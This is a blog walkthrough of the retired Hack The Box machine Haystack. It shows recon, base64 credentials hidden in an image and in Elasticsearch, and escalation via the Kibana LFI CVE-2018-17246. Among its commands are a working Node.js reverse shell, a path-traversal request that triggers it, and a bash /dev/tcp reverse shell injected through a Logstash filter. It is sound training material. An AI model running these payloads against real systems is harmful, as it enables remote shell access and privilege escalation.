I",K<p><img src="/wp-content/uploads/2019/08/haystack/badge.png" alt="Hack The Box Haystack" /></p>

<h1 id="intro">Intro</h1>
<p>Haystack is retired and now we can talk about it. At first I was fairly frustrated with this box. I really didn’t enjoy it much at the beginning, but after all was said and done I did have a bit of fun. The Spanish language was a nice twist, we have to remember there are a lot of systems out there that aren’t in English. I learned a bit about the ELK stack, which before this I knew next to nothing about. All in all it was a fairly good box.</p>

<h1 id="information-gathering">Information Gathering</h1>
<h2 id="port-scan-nmap">Port Scan: Nmap</h2>
<p>We begin our reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/media/sf_Research#</span><span class="w"> </span>nmap <span class="nt">-sVC</span> 10.10.10.115
<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-26 18:48 EDT
Nmap scan report for 10.10.10.115
Host is up (0.38s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
80/tcp   open  http    nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (text/html).
9200/tcp open  http    nginx 1.12.2
| http-methods:
|_  Potentially risky methods: DELETE
|_http-server-header: nginx/1.12.2
</span><span class="gp">|_http-title: Site doesn't have a title (application/json;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span><span class="nb">.</span>
<span class="go">
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.42 seconds
</span></code></pre></div></div>

<p>Ports open <strong>22</strong>, <strong>80</strong>, and <strong>9200</strong>.</p>

<h2 id="the-needle-port-80">The Needle: Port 80</h2>
<p>We see that there’s an Nginix page hosting only an image. This is a CTF after all, so let’s check and see if there’s anything hidden in this picture.</p>

<p><img src="/wp-content/uploads/2019/08/haystack/port80.png" alt="Port 80" />
<strong>Figure 1:</strong> needle.jpg displayed on port 80.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:~/Desktop#</span><span class="w"> </span>strings <span class="nt">-10</span> needle.jpg
<span class="go">paint.net 4.1.1
%&amp;'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
&amp;'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
</span><span class="gp">&gt;</span>S<span class="o">)</span>T<span class="p">;</span>M7<span class="se">\{</span>Y
<span class="gp">WEL/;</span>wg-J3
<span class="go">T.-UWuvFG,
</span><span class="gp">Euw!i$</span>goRk
<span class="gp">5)5=FI$</span>b[<span class="o">=</span>+
<span class="gp">*Oo!;</span>.o|?&gt;
<span class="go">bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
</span><span class="gp">root@kali:~/Desktop#</span><span class="w"> </span><span class="nb">echo </span><span class="nv">bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg</span><span class="o">==</span> | <span class="nb">base64</span> <span class="nt">--decode</span>
<span class="go">la aguja en el pajar es "clave"
</span></code></pre></div></div>

<p>We see that there is a <code class="language-plaintext highlighter-rouge">base64</code> encoded string in this <code class="language-plaintext highlighter-rouge">.jpg</code>. When we decode that we get the following message.</p>

<blockquote>
  <p>la aguja en el pajar es “clave”</p>
</blockquote>

<p>Translated to English this becomes,</p>

<blockquote>
  <p>the needle in the haystack is “key”</p>
</blockquote>

<h2 id="they-haystack-port-9200-elasticsearch">They Haystack: Port 9200 (Elasticsearch)</h2>
<p>The Elasticsearch database is where the haystack resides. When it’s queried we see that it’s version <code class="language-plaintext highlighter-rouge">6.4.2</code>.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/media/sf_Research#</span><span class="w"> </span>curl http://10.10.10.115:9200
<span class="go">{
  "name" : "iQEYHgS",
  "cluster_name" : "elasticsearch",
  "cluster_uuid" : "pjrX7V_gSFmJY-DxP4tCQg",
  "version" : {
    "number" : "6.4.2",
    "build_flavor" : "default",
    "build_type" : "rpm",C
    "build_hash" : "04711c2",
    "build_date" : "2018-09-26T13:34:09.098244Z",
    "build_snapshot" : false,
    "lucene_version" : "7.4.0",
    "minimum_wire_compatibility_version" : "5.6.0",
    "minimum_index_compatibility_version" : "5.0.0"
  },
  "tagline" : "You Know, for Search"
}
</span></code></pre></div></div>

<p>This version should have a local file inclusion vulnerability <code class="language-plaintext highlighter-rouge">CVE-2018-17246</code>, lets remember this for laster. For right now though, we need to find the information hidden in the haystack. After trying to make the query for <code class="language-plaintext highlighter-rouge">key</code>, nothing comes up. Using Spanish though, and making the query for <code class="language-plaintext highlighter-rouge">clave</code>, it returns some interesting records.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:~/Desktop#</span><span class="w"> </span>curl <span class="nt">-X</span> GET <span class="s2">"http://10.10.10.115:9200/_search?q=clave"</span>
<span class="go">{"took":23,"timed_out":false,"_shards":{"total":11,"successful":11,"skipped":0,"failed":0},"hits":{"total":2,"max_score":5.9335938,"hits":[{"_index":"quotes","_type":"quote","_id":"45","_score":5.9335938,"_source":{"quote":"Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "}},{"_index":"quotes","_type":"quote","_id":"111","_score":5.3459888,"_source":{"quote":"Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="}}]}}
</span></code></pre></div></div>

<p>Let’s decode these two base64 strings and see what they’re saying.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:~#</span><span class="w"> </span><span class="nb">echo </span>dXNlcjogc2VjdXJpdHkg | <span class="nb">base64</span> <span class="nt">--decode</span>
<span class="go">user: security
</span><span class="gp">root@kali:~#</span><span class="w"> </span><span class="nb">echo </span><span class="nv">cGFzczogc3BhbmlzaC5pcy5rZXk</span><span class="o">=</span> | <span class="nb">base64</span> <span class="nt">--decode</span>
<span class="go">pass: spanish.is.key
</span></code></pre></div></div>

<p>Now we have a user name and some credentials.</p>

<h1 id="exploitation">Exploitation</h1>

<h2 id="user-flag">User Flag</h2>

<p>Using the credentials found in the Elasticsearch database we’re able to ssh into the box and gain the user flag.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">[security@haystack ~]$</span><span class="w"> </span><span class="nb">cat </span>user.txt
<span class="go">04d18bc79dac1d4d48ee0a940c8eb929
</span></code></pre></div></div>

<h2 id="root-flag">Root Flag</h2>
<p>It may be intuitive that we’re exploiting the ELK stack here, and that the CVE is going to come into play. In order to confirm that this is the path to root, we view processes  running on the box with root permissions.</p>

<p><code class="language-plaintext highlighter-rouge">[security@haystack tmp]$ ps -elf|grep root</code></p>

<p><img src="/wp-content/uploads/2019/08/haystack/elk_is_root.png" alt="ELK is root" />
<strong>Figure 2:</strong> Logstash is running as root.</p>

<p>It’s now clear to us that <code class="language-plaintext highlighter-rouge">logstash</code>, which is the <code class="language-plaintext highlighter-rouge">L</code> in <code class="language-plaintext highlighter-rouge">ELK</code>, is running as root. When we attempt to view the current configuration files for <code class="language-plaintext highlighter-rouge">logstash</code> we see that the <code class="language-plaintext highlighter-rouge">security</code> user we currently have a shell as isn’t able to read them.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">[security@haystack conf.d]$</span><span class="w"> </span><span class="nb">pwd</span>
<span class="go">/etc/logstash/conf.d
</span><span class="gp">[security@haystack conf.d]$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="go">total 12
drwxrwxr-x. 2 root kibana  62 Jun 24 08:12 .
drwxr-xr-x. 3 root root   183 Jun 18 22:15 ..
-rw-r-----. 1 root kibana 131 Jun 20 10:59 filter.conf
-rw-r-----. 1 root kibana 186 Jun 24 08:12 input.conf
-rw-r-----. 1 root kibana 109 Jun 24 08:12 output.conf
</span><span class="gp">[security@haystack conf.d]$</span><span class="w"> </span><span class="nb">cat </span>filter.conf
<span class="go">cat: filter.conf: Permission denied
</span></code></pre></div></div>

<h3 id="pivot-to-kibana-user">Pivot to kibana user</h3>

<p>Researching known vulnerabilities in Elasticsearch <code class="language-plaintext highlighter-rouge">6.4.2</code>, we’ve come across <a href="https://github.com/mpgn/CVE-2018-17246">CVE-2018-17246</a>. The Github user <a href="https://github.com/mpgn">mpgn</a> has provided a proof of concept we can leverage to exploit this vulnerability for local file inclusion (LFI). This should allow us to get a shell as the user <code class="language-plaintext highlighter-rouge">kibana</code>, and do more with <code class="language-plaintext highlighter-rouge">logstash</code> than we currently have permission to do.</p>

<p>The javascript reverse shell code provided is as follows. All that’s needed for this to work out of the box is replacing our IP and port that netcat is listening on.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
    <span class="kd">var</span> <span class="nx">net</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">net</span><span class="dl">"</span><span class="p">),</span>
        <span class="nx">cp</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">child_process</span><span class="dl">"</span><span class="p">),</span>
        <span class="nx">sh</span> <span class="o">=</span> <span class="nx">cp</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="dl">"</span><span class="s2">/bin/sh</span><span class="dl">"</span><span class="p">,</span> <span class="p">[]);</span>
    <span class="kd">var</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">net</span><span class="p">.</span><span class="nx">Socket</span><span class="p">();</span>
    <span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="mi">4444</span><span class="p">,</span> <span class="dl">"</span><span class="s2">10.10.14.19</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
        <span class="nx">client</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">sh</span><span class="p">.</span><span class="nx">stdin</span><span class="p">);</span>
        <span class="nx">sh</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
        <span class="nx">sh</span><span class="p">.</span><span class="nx">stderr</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
    <span class="p">});</span>
    <span class="k">return</span> <span class="sr">/a/</span><span class="p">;</span> <span class="c1">// Prevents the Node.js application form crashing</span>
<span class="p">})();</span>
</code></pre></div></div>

<p>We place the shell code into a directory to which we have access as the <code class="language-plaintext highlighter-rouge">security</code> user. In this case we place the shell into <code class="language-plaintext highlighter-rouge">/dev/shm</code>, and name it <code class="language-plaintext highlighter-rouge">mahshell.js</code>.</p>

<p>We are able to determine that <code class="language-plaintext highlighter-rouge">kibana</code> is running locally on port <code class="language-plaintext highlighter-rouge">5601</code> by reading the <code class="language-plaintext highlighter-rouge">/etc/kibana/kibana.yml</code> file.</p>

<p><img src="/wp-content/uploads/2019/08/haystack/kibana_yml.png" alt="kibana yml" />
<strong>Figure 3:</strong> kibana.yml</p>

<p>We can make the following <code class="language-plaintext highlighter-rouge">curl</code> request to execute our reverse shell code.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">[security@haystack shm]$</span><span class="w"> </span>curl <span class="nt">-X</span> GET <span class="s2">"localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../dev/shm/mahshell.js"</span> <span class="nt">-H</span> <span class="s2">"kbn-xsrf: true"</span>
</code></pre></div></div>

<p><img src="/wp-content/uploads/2019/08/haystack/kibana_user.png" alt="kibana user" />
<strong>Figure 4</strong>: Shell as kibana user.</p>

<p>Now that we are the user <code class="language-plaintext highlighter-rouge">kibana</code>, we go back to the configuration files under <code class="language-plaintext highlighter-rouge">/etc/logstash/conf.d</code> and check out what <code class="language-plaintext highlighter-rouge">filter.conf</code> contains.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash-4.2$</span><span class="w"> </span><span class="nb">cd</span> /etc/logstash/conf.d
<span class="go">cd /etc/logstash/conf.d
</span><span class="gp">bash-4.2$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="go">ls -la
total 12
drwxrwxr-x. 2 root kibana  62 jun 24 08:12 .
drwxr-xr-x. 3 root root   183 jun 18 22:15 ..
-rw-r-----. 1 root kibana 131 jun 20 10:59 filter.conf
-rw-r-----. 1 root kibana 186 jun 24 08:12 input.conf
-rw-r-----. 1 root kibana 109 jun 24 08:12 output.conf
</span><span class="gp">bash-4.2$</span><span class="w"> </span><span class="nb">cat </span>filter.conf
<span class="go">cat filter.conf
filter {
	if [type] == "execute" {
		grok {
</span><span class="gp">			match =&gt;</span><span class="w"> </span><span class="o">{</span> <span class="s2">"message"</span> <span class="o">=&gt;</span> <span class="s2">"Ejecutar</span><span class="se">\s</span><span class="s2">*comando</span><span class="se">\s</span><span class="s2">*:</span><span class="se">\s</span><span class="s2">+%{GREEDYDATA:comando}"</span> <span class="o">}</span>
<span class="go">		}
	}
}
</span></code></pre></div></div>

<p>This filter allows us to execute commands with the proper input. By placing our own <code class="language-plaintext highlighter-rouge">logstash_x</code> file into the <code class="language-plaintext highlighter-rouge">/opt/kibana</code> directory, we should get command execution.</p>

<p>Our logstash file follows exactly as <code class="language-plaintext highlighter-rouge">filter.conf</code> defines. Small note, our IP address has changed due to reconnecting to the Hack The Box VPN the following day.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Ejecutar comando : bash -i &gt;&amp; /dev/tcp/10.10.15.201/6666  0&gt;&amp;1
</code></pre></div></div>

<p>After waiting a few seconds, the command to call our reverse shell is executed.</p>

<p><img src="/wp-content/uploads/2019/08/haystack/rooted.png" alt="Rooted" />
<strong>Figure: 5</strong> Rooted</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">[root@haystack /]#</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt
<span class="go">cat /root/root.txt
3f5f727c38d9f70e1d2ad2ba11059d92
</span></code></pre></div></div>

<h1 id="conclusion">Conclusion</h1>
<p>The user flag portion of this box was very CTF like. There’s not much chance that in the real world you’re going to come across a situation where clues are hidden in a <code class="language-plaintext highlighter-rouge">.jpg</code> and then <code class="language-plaintext highlighter-rouge">base64</code> encoded credentials are hidden in a database that contains a large amount of arbitrary data. I did learn from this experience though. This was the first time I’ve had to find a string hidden in an image, and it was my first experience with Elasticsearch queries.</p>

<p>The root portion of this box was rather difficult for me with my lack of experience in the ELK stack. It didn’t take long to find the local file inclusion vulnerability, but leveraging it to get root really required me to research how <code class="language-plaintext highlighter-rouge">logstash</code> and <code class="language-plaintext highlighter-rouge">kibana</code> work. All in all I’m pleased to have completed the box.</p>

<h2 id="references">References</h2>
<ol>
  <li><a href="https://www.socketloop.com/tutorials/elastic-search-return-all-records-higher-than-default-10">https://www.socketloop.com/tutorials/elastic-search-return-all-records-higher-than-default-10</a></li>
  <li><a href="https://superuser.com/questions/803225/how-to-find-detect-hidden-files-inside-jpeg-file">https://superuser.com/questions/803225/how-to-find-detect-hidden-files-inside-jpeg-file</a></li>
  <li><a href="https://github.com/mpgn/CVE-2018-17246">https://github.com/mpgn/CVE-2018-17246</a></li>
  <li><a href="https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/">https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/</a></li>
  <li><a href="https://www.anquanke.com/post/id/168291">https://www.anquanke.com/post/id/168291</a></li>
  <li><a href="https://grokdebug.herokuapp.com/">https://grokdebug.herokuapp.com/</a></li>
</ol>
:ET